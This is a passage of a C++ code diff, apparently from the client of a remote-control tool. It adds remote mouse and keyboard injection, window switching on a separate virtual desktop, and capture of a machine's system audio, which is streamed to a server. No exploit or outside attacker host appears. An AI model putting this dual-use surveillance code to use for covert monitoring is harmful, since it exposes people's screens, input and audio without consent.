     }
+
+    // 窗口捕获模式：只能查看，不能控制
+    if (m_ScreenSpyObject && m_ScreenSpyObject->GetTargetWindow()) {
+        return;
+    }
+
     for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
         MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
-            (MSG64*)msg64.Create(msg32.Create(ptr, msgSize));
+                     (MSG64*)msg64.Create(msg32.Create(ptr, msgSize));
 
         INPUT input = { 0 };
         input.type = INPUT_MOUSE;
@@ -1058,16 +2044,16 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             }
 
             // 映射到 0-65535 的绝对坐标空间
-			if (m_ScreenSpyObject->GetScreenCount() > 1) {
-				// 多显示器模式下，必须重新计算 dx, dy 映射到全虚拟桌面空间
-				// 且必须带上 MOUSEEVENTF_VIRTUALDESK 标志
-				input.mi.dx = ((Point.x - m_ScreenSpyObject->GetVScreenLeft()) * 65535) / (m_ScreenSpyObject->GetVScreenWidth() - 1);
-				input.mi.dy = ((Point.y - m_ScreenSpyObject->GetVScreenTop()) * 65535) / (m_ScreenSpyObject->GetVScreenHeight() - 1);
+            if (m_ScreenSpyObject->GetScreenCount() > 1) {
+                // 多显示器模式下，必须重新计算 dx, dy 映射到全虚拟桌面空间
+                // 且必须带上 MOUSEEVENTF_VIRTUALDESK 标志
+                input.mi.dx = ((Point.x - m_ScreenSpyObject->GetVScreenLeft()) * 65535) / (m_ScreenSpyObject->GetVScreenWidth() - 1);
+                input.mi.dy = ((Point.y - m_ScreenSpyObject->GetVScreenTop()) * 65535) / (m_ScreenSpyObject->GetVScreenHeight() - 1);
                 input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK;
             } else {
-				input.mi.dx = (Point.x * 65535) / (m_ScreenSpyObject->GetScreenWidth() - 1);
-				input.mi.dy = (Point.y * 65535) / (m_ScreenSpyObject->GetScreenHeight() - 1);
-				input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
+                input.mi.dx = (Point.x * 65535) / (m_ScreenSpyObject->GetScreenWidth() - 1);
+                input.mi.dy = (Point.y * 65535) / (m_ScreenSpyObject->GetScreenHeight() - 1);
+                input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
             }
         }
 
@@ -1098,7 +2084,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             break;
 
         case WM_LBUTTONDBLCLK:
-            // 前面已经收到了一个完整的 Down/Up, 这里我们只需要补一个“按下”动作, 系统就会认定这是双击
+            // 前面已经收到了一个完整的 Down/Up, 这里我们只需要补一个"按下"动作, 系统就会认定这是双击
             input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
             SendInput(1, &input, sizeof(INPUT));
             break;
@@ -1124,9 +2110,9 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             INPUT k_input = { 0 };
             k_input.type = INPUT_KEYBOARD;
             k_input.ki.wVk = (WORD)Msg->wParam;
-            k_input.ki.wScan = MapVirtualKey((UINT)Msg->wParam, 0);
+            k_input.ki.wScan = (Msg->lParam >> 16) & 0xFF;   // 从 lParam 取真实扫描码
             k_input.ki.dwFlags = 0;
-            if (IsExtendedKey(Msg->wParam))
+            if ((Msg->lParam >> 24) & 1)                       // 从 lParam bit24 取扩展键标志
                 k_input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
             SendInput(1, &k_input, sizeof(INPUT));
             break;
@@ -1136,13 +2122,506 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             INPUT k_input = { 0 };
             k_input.type = INPUT_KEYBOARD;
             k_input.ki.wVk = (WORD)Msg->wParam;
-            k_input.ki.wScan = MapVirtualKey((UINT)Msg->wParam, 0);
+            k_input.ki.wScan = (Msg->lParam >> 16) & 0xFF;   // 从 lParam 取真实扫描码
             k_input.ki.dwFlags = KEYEVENTF_KEYUP;
-            if (IsExtendedKey(Msg->wParam))
+            if ((Msg->lParam >> 24) & 1)                       // 从 lParam bit24 取扩展键标志
                 k_input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
             SendInput(1, &k_input, sizeof(INPUT));
             break;
         }
         }
     }
+}
+
+// 枚举窗口回调函数，收集任务栏上的窗口
+static BOOL CALLBACK EnumWindowsForSwitch(HWND hWnd, LPARAM lParam)
+{
+    std::vector<HWND>* pWindows = (std::vector<HWND>*)lParam;
+
+    // 检查窗口是否可见
+    if (!IsWindowVisible(hWnd))
+        return TRUE;
+
+    // 检查窗口是否有任务栏按钮（排除工具窗口、子窗口等）
+    LONG exStyle = GetWindowLongA(hWnd, GWL_EXSTYLE);
+    if (exStyle & WS_EX_TOOLWINDOW)
+        return TRUE;
+
+    // 获取窗口标题，排除无标题窗口
+    char title[256] = {};
+    GetWindowTextA(hWnd, title, sizeof(title));
+    if (strlen(title) == 0)
+        return TRUE;
+
+    // 排除不可见的窗口所有者
+    HWND hOwner = GetWindow(hWnd, GW_OWNER);
+    if (hOwner && !IsWindowVisible(hOwner))
+        return TRUE;
+
+    // 排除最小化且被隐藏的窗口
+    if (IsIconic(hWnd) && !(exStyle & WS_EX_APPWINDOW))
+        return TRUE;
+
+    // 检查是否为应用窗口（有 WS_EX_APPWINDOW 或无 owner）
+    if (!(exStyle & WS_EX_APPWINDOW) && hOwner)
+        return TRUE;
+
+    pWindows->push_back(hWnd);
+    return TRUE;
+}
+
+void CScreenManager::SwitchToNextWindow()
+{
+    // 收集所有任务栏窗口
+    std::vector<HWND> windows;
+
+    if (m_virtual && g_hDesk) {
+        // 虚拟桌面模式：枚举虚拟桌面上的窗口
+        SetThreadDesktop(g_hDesk);
+        EnumDesktopWindows(g_hDesk, EnumWindowsForSwitch, (LPARAM)&windows);
+    } else {
+        // 普通模式：枚举所有窗口
+        EnumWindows(EnumWindowsForSwitch, (LPARAM)&windows);
+    }
+
+    if (windows.empty()) {
+        Mprintf("SwitchToNextWindow: 没有可切换的窗口\n");
+        return;
+    }
+
+    // 循环切换到下一个窗口
+    m_nSwitchWindowIndex = (m_nSwitchWindowIndex + 1) % windows.size();
+    HWND hTarget = windows[m_nSwitchWindowIndex];
+
+    char title[256] = {};
+    GetWindowTextA(hTarget, title, sizeof(title));
+    Mprintf("SwitchToNextWindow: 切换到窗口 %d/%d: %s [%p]\n",
+            m_nSwitchWindowIndex + 1, (int)windows.size(), title, hTarget);
+
+    // 如果窗口被最小化，先恢复
+    if (IsIconic(hTarget)) {
+        ShowWindow(hTarget, SW_RESTORE);
+    }
+
+    // 将窗口置于最前面
+    SetForegroundWindow(hTarget);
+    BringWindowToTop(hTarget);
+}
+
+void CScreenManager::LoadQualityProfiles()
+{
+    iniFile cfg(CLIENT_PATH);
+    for (int i = 0; i < QUALITY_COUNT; i++) {
+        char section[32];
+        sprintf(section, "profile%d", i);
+        // 读取配置，没有则用默认值
+        const QualityProfile& def = GetQualityProfile(i);
+        m_QualityProfiles[i].maxFPS = cfg.GetInt(section, "maxFPS", def.maxFPS);
+        m_QualityProfiles[i].maxWidth = cfg.GetInt(section, "maxWidth", def.maxWidth);
+        m_QualityProfiles[i].algorithm = cfg.GetInt(section, "algorithm", def.algorithm);
+        m_QualityProfiles[i].bitRate = cfg.GetInt(section, "bitRate", def.bitRate);
+    }
+}
+
+void CScreenManager::SaveQualityProfiles()
+{
+    iniFile cfg(CLIENT_PATH);
+    for (int i = 0; i < QUALITY_COUNT; i++) {
+        const QualityProfile& def = GetQualityProfile(i);
+        const QualityProfile& cur = m_QualityProfiles[i];
+        // 只有与默认值不同时才保存
+        if (cur.maxFPS == def.maxFPS && cur.maxWidth == def.maxWidth &&
+            cur.algorithm == def.algorithm && cur.bitRate == def.bitRate) {
+            continue;
+        }
+        char section[32];
+        sprintf(section, "profile%d", i);
+        cfg.SetInt(section, "maxFPS", cur.maxFPS);
+        cfg.SetInt(section, "maxWidth", cur.maxWidth);
+        cfg.SetInt(section, "algorithm", cur.algorithm);
+        cfg.SetInt(section, "bitRate", cur.bitRate);
+    }
+}
+
+// ========== WASAPI 系统音频捕获实现 ==========
+
+BOOL CScreenManager::InitWASAPILoopback()
+{
+    if (m_bAudioInitialized) return TRUE;
+
+    HRESULT hr;
+    IMMDeviceEnumerator* pEnumerator = nullptr;
+
+    // 注意：COM 应该由调用线程初始化（音频线程在启动时已初始化）
+
+    // 创建设备枚举器
+    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
+                          __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+    if (FAILED(hr)) {
+        Mprintf("创建 MMDeviceEnumerator 失败: 0x%08X\n", hr);
+        return FALSE;
+    }
+
+    // 获取默认音频输出设备（用于 loopback）
+    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &m_pAudioDevice);
+    pEnumerator->Release();
+    if (FAILED(hr)) {
+        Mprintf("获取默认音频设备失败: 0x%08X\n", hr);
+        return FALSE;
+    }
+
+    // 激活音频客户端
+    hr = m_pAudioDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&m_pAudioClient);
+    if (FAILED(hr)) {
+        Mprintf("激活 IAudioClient 失败: 0x%08X\n", hr);
+        UninitWASAPI();
+        return FALSE;
+    }
+
+    // 获取设备混音格式
+    WAVEFORMATEX* pWaveFormat = nullptr;
+    hr = m_pAudioClient->GetMixFormat(&pWaveFormat);
+    if (FAILED(hr)) {
+        Mprintf("获取混音格式失败: 0x%08X\n", hr);
+        UninitWASAPI();
+        return FALSE;
+    }
+    m_pWaveFormat = pWaveFormat;
+
+    // 检测格式类型
+    const char* formatType = "Unknown";
+    if (pWaveFormat->wFormatTag == WAVE_FORMAT_PCM) {
+        formatType = "PCM";
+    } else if (pWaveFormat->wFormatTag == WAVE_FORMAT_IEEE_FLOAT) {
+        formatType = "IEEE Float";
+    } else if (pWaveFormat->wFormatTag == WAVE_FORMAT_EXTENSIBLE) {
+        formatType = IsFloatFormat(pWaveFormat) ? "Extensible (Float)" : "Extensible (PCM)";
+    }
+    Mprintf("音频格式: %d Hz, %d 声道, %d 位, 类型=%s\n",
+            pWaveFormat->nSamplesPerSec, pWaveFormat->nChannels,
+            pWaveFormat->wBitsPerSample, formatType);
+
+    // 初始化音频客户端（Loopback 模式）
+    // 缓冲区大小 100ms
+    REFERENCE_TIME hnsRequestedDuration = 1000000;  // 100ms in 100-nanosecond units
+    hr = m_pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED,
+                                     AUDCLNT_STREAMFLAGS_LOOPBACK,
+                                     hnsRequestedDuration, 0,
+                                     pWaveFormat, NULL);
+    if (FAILED(hr)) {
+        Mprintf("IAudioClient::Initialize 失败: 0x%08X\n", hr);
+        UninitWASAPI();
+        return FALSE;
+    }
+
+    // 获取捕获客户端
+    hr = m_pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&m_pCaptureClient);
+    if (FAILED(hr)) {
+        Mprintf("获取 IAudioCaptureClient 失败: 0x%08X\n", hr);
+        UninitWASAPI();
+        return FALSE;
+    }
+
+    // 启动捕获
+    hr = m_pAudioClient->Start();
+    if (FAILED(hr)) {
+        Mprintf("启动音频捕获失败: 0x%08X\n", hr);
+        UninitWASAPI();
+        return FALSE;
+    }
+
+    m_bAudioInitialized = TRUE;
+    Mprintf("WASAPI Loopback 初始化成功\n");
+    return TRUE;
+}
+
+void CScreenManager::UninitWASAPI()
+{
+    if (m_pAudioClient) {
+        m_pAudioClient->Stop();
+    }
+    if (m_pCaptureClient) {
+        m_pCaptureClient->Release();
+        m_pCaptureClient = nullptr;
+    }
+    if (m_pAudioClient) {
+        m_pAudioClient->Release();
+        m_pAudioClient = nullptr;
+    }
+    if (m_pWaveFormat) {
+        CoTaskMemFree(m_pWaveFormat);
+        m_pWaveFormat = nullptr;
+    }
+    if (m_pAudioDevice) {
+        m_pAudioDevice->Release();
+        m_pAudioDevice = nullptr;
+    }
+    m_bAudioInitialized = FALSE;
+}
+
+void CScreenManager::HandleAudioCtrl(BYTE enable, BYTE persist)
+{
+    m_ScreenSettings.AudioEnabled = enable;
+
+    // 持久化到客户端配置
+    if (persist) {
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "AudioEnabled", enable);
+    }
+
+    if (enable) {
+        // 启用音频：唤醒线程（WASAPI 由音频线程自己初始化）
+        if (m_hAudioEvent) {
+            SetEvent(m_hAudioEvent);
+        }
+        Mprintf("音频传输已启用\n");
+    } else {
+        // 禁用音频：线程会自动挂起等待事件
+        Mprintf("音频传输已禁用\n");
+    }
+}
+
+// 将 Float32 样本转换为 Int16 样本
+static inline short FloatToInt16(float sample)
+{
+    // 限制范围 [-1.0, 1.0]
+    if (sample > 1.0f) sample = 1.0f;
+    if (sample < -1.0f) sample = -1.0f;
+    return (short)(sample * 32767.0f);
+}
+
+#if USING_OPUS
+#include "compress/opus/opus_wrapper.h"
+#endif
+
+DWORD WINAPI CScreenManager::AudioThreadProc(LPVOID lpParam)
+{
+    CScreenManager* pThis = (CScreenManager*)lpParam;
+
+    // 线程内初始化 COM
+    HRESULT hrCom = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    // 发送缓冲区：[TOKEN][hasFormat][AudioFormat?][data...]
+    const UINT32 MAX_BUFFER = 64 * 1024;
+    BYTE* pSendBuffer = new BYTE[MAX_BUFFER];
+    short* pPcmBuffer = new short[MAX_BUFFER / 2];  // PCM 转换缓冲区
+    BOOL firstFrame = TRUE;
+
+#if USING_OPUS
+    // Opus 编码器和累积缓冲区
+    COpusEncoder opusEncoder;
+    BOOL opusInitialized = FALSE;
+    const int OPUS_FRAME_SIZE = 960;  // 20ms @ 48kHz
+    short* pOpusAccumBuffer = new short[OPUS_FRAME_SIZE * 2];  // 立体声
+    int nAccumSamples = 0;  // 已累积的样本数（每声道）
+    BYTE* pOpusOutBuffer = new BYTE[4000];  // Opus 输出缓冲区
+    Mprintf("音频线程启动 (Opus 压缩启用)\n");
+#else
+    Mprintf("音频线程启动\n");
+#endif
+
+    while (pThis->m_bAudioThreadRunning) {
+        // 如果音频未启用，挂起等待
+        if (!pThis->m_ScreenSettings.AudioEnabled) {
+            firstFrame = TRUE;  // 下次启用时重新发送格式
+            WaitForSingleObject(pThis->m_hAudioEvent, INFINITE);
+            if (!pThis->m_bAudioThreadRunning) break;
+            continue;
+        }
+
+        // 如果 WASAPI 未初始化，尝试初始化（在音频线程中初始化确保 COM 正确）
+        if (!pThis->m_bAudioInitialized || !pThis->m_pCaptureClient) {
+            if (!pThis->InitWASAPILoopback()) {
+                // 初始化失败，等待后重试
+                WaitForSingleObject(pThis->m_hAudioEvent, 1000);
+                continue;
+            }
+        }
+
+        UINT32 packetLength = 0;
+        HRESULT hr = pThis->m_pCaptureClient->GetNextPacketSize(&packetLength);
+        if (FAILED(hr)) {
+            // WASAPI 调用失败，可能是设备状态变化（如切换显示器），重新初始化
+            Mprintf("GetNextPacketSize 失败: 0x%08X，重新初始化 WASAPI\n", hr);
+            pThis->UninitWASAPI();
+            Sleep(100);
+            continue;
+        }
+
+        while (packetLength > 0 && pThis->m_bAudioThreadRunning && pThis->m_ScreenSettings.AudioEnabled) {
+            BYTE* pData = nullptr;
+            UINT32 numFramesAvailable = 0;
+            DWORD flags = 0;
+
+            hr = pThis->m_pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL);
+            if (FAILED(hr)) {
+                Mprintf("GetBuffer 失败: 0x%08X，重新初始化 WASAPI\n", hr);
+                pThis->UninitWASAPI();
+                break;
+            }
+
+            WAVEFORMATEX* pWaveFmt = (WAVEFORMATEX*)pThis->m_pWaveFormat;
+            if (numFramesAvailable > 0 && pWaveFmt) {
+                UINT32 numChannels = pWaveFmt->nChannels;
+                UINT32 numSamples = numFramesAvailable * numChannels;
+
+                // 判断源格式（使用精确的 SubFormat GUID 检测）
+                BOOL isFloat = IsFloatFormat(pWaveFmt);
+
+                // 检查是否支持的格式
+                if (!isFloat && pWaveFmt->wBitsPerSample != 16) {
+                    // 不支持的格式，跳过
+                    pThis->m_pCaptureClient->ReleaseBuffer(numFramesAvailable);
+                    hr = pThis->m_pCaptureClient->GetNextPacketSize(&packetLength);
+                    if (FAILED(hr)) {
+                        Mprintf("GetNextPacketSize 失败 (内部): 0x%08X，重新初始化 WASAPI\n", hr);
+                        pThis->UninitWASAPI();
+                        break;
+                    }
+                    continue;
+                }
+
+                // 转换 PCM 数据
+                short* pConvertedPcm = pPcmBuffer;
+                UINT32 convertedSamples = numSamples;
+
+                if (flags & AUDCLNT_BUFFERFLAGS_SILENT) {
+                    // 静音帧：填充零
+                    memset(pPcmBuffer, 0, numSamples * sizeof(short));
+                } else if (isFloat) {
+                    // Float32 -> Int16 转换
+                    float* pFloatData = (float*)pData;
+                    for (UINT32 i = 0; i < numSamples && i < MAX_BUFFER / 2; i++) {
+                        pPcmBuffer[i] = FloatToInt16(pFloatData[i]);
+                    }
+                } else {
+                    // 已经是 16-bit PCM，直接使用
+                    pConvertedPcm = (short*)pData;
+                }
+
+#if USING_OPUS
+                // ===== Opus 编码模式 =====
+                // 初始化 Opus 编码器
+                if (!opusInitialized && pWaveFmt->nSamplesPerSec == 48000) {
+                    if (opusEncoder.Init(48000, numChannels, 64000)) {
+                        opusInitialized = TRUE;
+                        Mprintf("Opus 编码器初始化成功: 48000 Hz, %d ch, 64 kbps\n", numChannels);
+                    }
+                }
+
+                if (opusInitialized) {
+                    // 累积样本到 Opus 帧缓冲区
+                    int frameSamples = numFramesAvailable;  // 每声道样本数
+                    int srcOffset = 0;
+
+                    while (srcOffset < (int)numFramesAvailable) {
+                        // 计算可以复制的样本数
+                        int toCopy = min((int)numFramesAvailable - srcOffset, OPUS_FRAME_SIZE - nAccumSamples);
+
+                        // 复制到累积缓冲区
+                        memcpy(pOpusAccumBuffer + nAccumSamples * numChannels,
+                               pConvertedPcm + srcOffset * numChannels,
+                               toCopy * numChannels * sizeof(short));
+                        nAccumSamples += toCopy;
+                        srcOffset += toCopy;
+
+                        // 累积满一帧，编码并发送
+                        if (nAccumSamples >= OPUS_FRAME_SIZE) {
+                            int encodedLen = opusEncoder.Encode(pOpusAccumBuffer, OPUS_FRAME_SIZE,
+                                                                 pOpusOutBuffer, 4000);
+                            if (encodedLen > 0) {
+                                // 构造发送数据包
+                                UINT32 offset = 0;
+                                pSendBuffer[offset++] = TOKEN_SCREEN_AUDIO;
+
+                                if (firstFrame) {
+                                    pSendBuffer[offset++] = 1;  // hasFormat = true
+                                    AudioFormat fmt;
+                                    fmt.channels = (WORD)numChannels;
+                                    fmt.sampleRate = pWaveFmt->nSamplesPerSec;
+                                    fmt.bitsPerSample = 16;
+                                    fmt.blockAlign = (WORD)(numChannels * 2);
+                                    fmt.compression = AUDIO_COMPRESS_OPUS;
+                                    fmt.reserved = 0;
+                                    memcpy(pSendBuffer + offset, &fmt, sizeof(AudioFormat));
+                                    offset += sizeof(AudioFormat);
+                                    firstFrame = FALSE;
+                                    Mprintf("发送音频格式: %d Hz, %d ch, Opus 压缩\n",
+                                            fmt.sampleRate, fmt.channels);
+                                } else {
+                                    pSendBuffer[offset++] = 0;  // hasFormat = false
+                                }
+
+                                // 发送压缩数据
+                                memcpy(pSendBuffer + offset, pOpusOutBuffer, encodedLen);
+                                pThis->m_ClientObject->Send2Server((char*)pSendBuffer, offset + encodedLen);
+                            }
+                            nAccumSamples = 0;
+                        }
+                    }
+                }
+#else
+                // ===== PCM 无压缩模式 =====
+                // 构造发送数据包
+                UINT32 offset = 0;
+                pSendBuffer[offset++] = TOKEN_SCREEN_AUDIO;
+
+                // 首帧带格式信息
+                if (firstFrame) {
+                    pSendBuffer[offset++] = 1;  // hasFormat = true
+                    AudioFormat fmt;
+                    fmt.channels = (WORD)numChannels;
+                    fmt.sampleRate = pWaveFmt->nSamplesPerSec;
+                    fmt.bitsPerSample = 16;
+                    fmt.blockAlign = (WORD)(numChannels * 2);
+                    fmt.compression = AUDIO_COMPRESS_NONE;
+                    fmt.reserved = 0;
+                    memcpy(pSendBuffer + offset, &fmt, sizeof(AudioFormat));
+                    offset += sizeof(AudioFormat);
+                    firstFrame = FALSE;
+                    Mprintf("发送音频格式: %d Hz, %d ch, 16 bit PCM (源: %d bit %s)\n",
+                            fmt.sampleRate, fmt.channels, pWaveFmt->wBitsPerSample,
+                            isFloat ? "Float" : "PCM");
+                } else {
+                    pSendBuffer[offset++] = 0;  // hasFormat = false
+                }
+
+                // 发送 PCM 数据
+                UINT32 audioDataSize = convertedSamples * sizeof(short);
+                if (offset + audioDataSize <= MAX_BUFFER) {
+                    memcpy(pSendBuffer + offset, pConvertedPcm, audioDataSize);
+                    pThis->m_ClientObject->Send2Server((char*)pSendBuffer, offset + audioDataSize);
+                }
+#endif
+            }
+
+            pThis->m_pCaptureClient->ReleaseBuffer(numFramesAvailable);
+
+            hr = pThis->m_pCaptureClient->GetNextPacketSize(&packetLength);
+            if (FAILED(hr)) {
+                Mprintf("GetNextPacketSize 失败 (循环末): 0x%08X，重新初始化 WASAPI\n", hr);
+                pThis->UninitWASAPI();
+                break;
+            }
+        }
+
+        Sleep(10);  // ~100Hz 采集
+    }
+
+    delete[] pSendBuffer;
+    delete[] pPcmBuffer;
+
+#if USING_OPUS
+    delete[] pOpusAccumBuffer;
+    delete[] pOpusOutBuffer;
+    opusEncoder.Destroy();
+#endif
+
+    // 反初始化 COM
+    if (SUCCEEDED(hrCom)) {
+        CoUninitialize();
+    }
+
+    Mprintf("音频线程退出\n");
+    return 0;
 }
